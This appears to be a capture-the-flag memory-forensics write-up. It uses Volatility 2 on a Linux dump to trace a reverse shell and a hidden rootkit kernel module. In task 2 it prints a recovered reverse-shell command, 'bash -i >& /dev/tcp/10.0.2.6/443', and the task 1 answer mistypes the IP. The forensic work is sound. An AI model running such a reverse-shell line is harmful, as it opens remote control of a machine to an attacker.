
## Setup

For the challenge python2.7 is required to run volatility 2 as the challenge provides `.mem` file and `Ubuntu-*` profile which volatility3 can be a pain in the ass

setting up python 2.7.16 env with pyenv
```
brew install pyenv
pyenv install 2.7.1
export PATH="$(pyenv root)/shims:${PATH}"
echo 'PATH=$(pyenv root)/shims:$PATH' >> ~/.zshrc
pyenv init
```
https://stackoverflow.com/questions/71739870/how-to-install-python-2-on-macos-12-3

## Volatility 2

cloning the git
`https://github.com/volatilityfoundation/volatility.git`

moving into pyenv shell
`pyenv shell 2.7.18`

Everything works. Moving the given Ubuntu* profile zip folder to `<volatility-git-root>\volatility\plugins\overlays\linux\` folder and the command

`python vol.py --info ` showed the profile as `LinuxUbuntu_5_3_0-70-generic_profilex64`

## Analysis on .mem file

### task 1

`linux_netstat` gave the following
```
TCP      10.0.2.15       :55704 10.0.2.6        :  443 ESTABLISHED                  bash/3633
TCP      10.0.2.15       :55704 10.0.2.6        :  443 ESTABLISHED                  bash/3633
TCP      10.0.2.15       :55704 10.0.2.6        :  443 ESTABLISHED                  bash/3633
TCP      10.0.2.15       :55704 10.0.2.6        :  443 ESTABLISHED                  bash/3633
```

Answer : 10.0.2.16:443

### task 2

`strings dump.mem | grep 10.0.2.6` gave some strings in dump file which contains entries for root process which started the reverse shell
`root      3632  0.0  0.2  18380  3100 ?        S    20:42   0:00 /bin/bash -c bash -i >& /dev/tcp/10.0.2.6/443 0>&1`

### task 3

`python vol.py -f ../dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_hidden_modules`

gave the malicious hidden module `nfentlink`

### task 4


### task 5
find inode of the module file
`python volatility/vol.py -f dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_find_file -F '/lib/modules/5.3.0-70-generic/kernel/drivers/net/nfnetlink.ko'`

dumping the module file
`python volatility/vol.py -f dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_find_file -i 0xffff98ea266b5a68 -O nfnetlink.ko`

### task 6

`md5sum nfnetlink.ko`

`35bd8e64b021b862a0e650b13e0a57f7`

### task 7

from the file system dump the legit path for the netlink module is
`/lib/modules/5.3.0-70-generic/kernel/net/netfilter/nfnetlink.ko`

### task 8

dumping the legit module
`python volatility/vol.py -f dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_find_file -i 0xffff98ea427dcda8 -O nfnetlink-legit.ko`


### task 9

searching for the strings in the dumpe module `nfnetfilter_init` is the function to initialize the module

### task 10
`__x64_sys_kill`

### task 11

64 - SIGMAX
